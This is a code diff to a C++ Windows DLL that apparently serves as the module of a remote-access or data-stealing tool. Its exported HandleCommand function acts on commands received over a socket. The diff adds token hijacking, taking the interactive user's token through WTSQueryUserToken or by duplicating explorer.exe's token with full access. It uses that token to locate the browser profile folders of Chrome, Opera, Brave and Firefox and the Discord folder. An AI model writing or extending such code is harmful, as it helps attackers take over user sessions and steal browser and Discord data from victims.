@@ -1812,14 +1812,27 @@ static wstring find_gecko_profile_fallback(const wstring& sourceUserData) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
+    HANDLE hToken = GetLaunchToken();
     if (browserName == L"Opera" || browserName == L"Opera GX") {
-        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, hToken, 0, szPath) != S_OK) {
+            if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) {
+                if (hToken) CloseHandle(hToken);
+                return L"";
+            }
+        }
+        if (hToken) CloseHandle(hToken);
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
         else path += L"\\Opera Software\\Opera GX Stable";
         return path;
     } else {
-        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, hToken, 0, szPath) != S_OK) {
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) {
+                if (hToken) CloseHandle(hToken);
+                return L"";
+            }
+        }
+        if (hToken) CloseHandle(hToken);
         wstring path = szPath;
         if (browserName == L"Google Chrome") {
             path += L"\\Google\\Chrome\\User Data";
@@ -1834,9 +1847,71 @@ static wstring get_browser_profile_path(const wstring& browserName) {
     }
 }
 
+typedef DWORD (WINAPI *pfnWTSGetActiveConsoleSessionId)();
+typedef BOOL (WINAPI *pfnWTSQueryUserToken)(ULONG SessionId, PHANDLE phToken);
+
+static HANDLE GetLaunchToken() {
+    HANDLE hToken = NULL;
+
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (hKernel32) {
+        auto pWTSGetActiveConsoleSessionId = (pfnWTSGetActiveConsoleSessionId)GetProcAddress(hKernel32, "WTSGetActiveConsoleSessionId");
+        if (pWTSGetActiveConsoleSessionId) {
+            DWORD sessionId = pWTSGetActiveConsoleSessionId();
+            if (sessionId != 0xFFFFFFFF) {
+                HMODULE hWtsapi32 = LoadLibraryW(L"wtsapi32.dll");
+                if (hWtsapi32) {
+                    auto pWTSQueryUserToken = (pfnWTSQueryUserToken)GetProcAddress(hWtsapi32, "WTSQueryUserToken");
+                    if (pWTSQueryUserToken) {
+                        HANDLE hUserToken = NULL;
+                        if (pWTSQueryUserToken(sessionId, &hUserToken)) {
+                            DuplicateTokenEx(hUserToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hToken);
+                            CloseHandle(hUserToken);
+                        }
+                    }
+                    FreeLibrary(hWtsapi32);
+                }
+            }
+        }
+    }
+
+    if (hToken) return hToken;
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
+                    if (hProc) {
+                        HANDLE hTok = NULL;
+                        if (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hTok)) {
+                            DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hToken);
+                            CloseHandle(hTok);
+                        }
+                        CloseHandle(hProc);
+                    }
+                    if (hToken) break;
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    return hToken;
+}
+
 static wstring get_gecko_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+    HANDLE hToken = GetLaunchToken();
+    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, hToken, 0, szPath) != S_OK) {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) {
+            if (hToken) CloseHandle(hToken);
+            return L"";
+        }
+    }
+    if (hToken) CloseHandle(hToken);
 
     wstring path = szPath;
     if (browserName == L"Firefox") {
@@ -2096,7 +2171,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring exePath;
                     if (wRequestedPath == L"Discord") {
                         wchar_t localApp[MAX_PATH] = {0};
-                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        HANDLE hToken = GetLaunchToken();
+                        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, hToken, 0, localApp) != S_OK) {
+                            SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        }
+                        if (hToken) CloseHandle(hToken);
                         fs::path discDir(wstring(localApp) + L"\\Discord");
                         if (fs::exists(discDir)) {
                             wstring bestAppDir;
@@ -2119,7 +2198,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                     } else if (wRequestedPath == L"Opera") {
                         wchar_t localApp[MAX_PATH] = {0};
-                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        HANDLE hToken = GetLaunchToken();
+                        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, hToken, 0, localApp) != S_OK) {
+                            SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        }
+                        if (hToken) CloseHandle(hToken);
                         exePath = wstring(localApp) + L"\\Programs\\Opera\\launcher.exe";
                         if (!fs::exists(exePath)) exePath = wstring(localApp) + L"\\Programs\\Opera\\opera.exe";
                         if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Opera\\launcher.exe";
@@ -2128,7 +2211,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Opera\\opera.exe";
                     } else if (wRequestedPath == L"Opera GX") {
                         wchar_t localApp[MAX_PATH] = {0};
-                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        HANDLE hToken = GetLaunchToken();
+                        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, hToken, 0, localApp) != S_OK) {
+                            SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        }
+                        if (hToken) CloseHandle(hToken);
                         exePath = wstring(localApp) + L"\\Programs\\Opera GX\\launcher.exe";
                         if (!fs::exists(exePath)) exePath = wstring(localApp) + L"\\Programs\\Opera GX\\opera.exe";
                         if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Opera GX\\launcher.exe";
@@ -2140,7 +2227,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
                         if (!fs::exists(exePath)) {
                             wchar_t localApp[MAX_PATH] = {0};
-                            SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                            HANDLE hToken = GetLaunchToken();
+                            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, hToken, 0, localApp) != S_OK) {
+                                SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                            }
+                            if (hToken) CloseHandle(hToken);
                             exePath = wstring(localApp) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
                         }
                     } else {
